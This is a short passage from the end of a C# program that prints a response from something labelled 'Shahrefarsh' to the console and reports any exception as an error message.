                Console.WriteLine("[Shahrefarsh] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Shahrefarsh] Error: " + ex.ToString());
            }
        }
    }
}
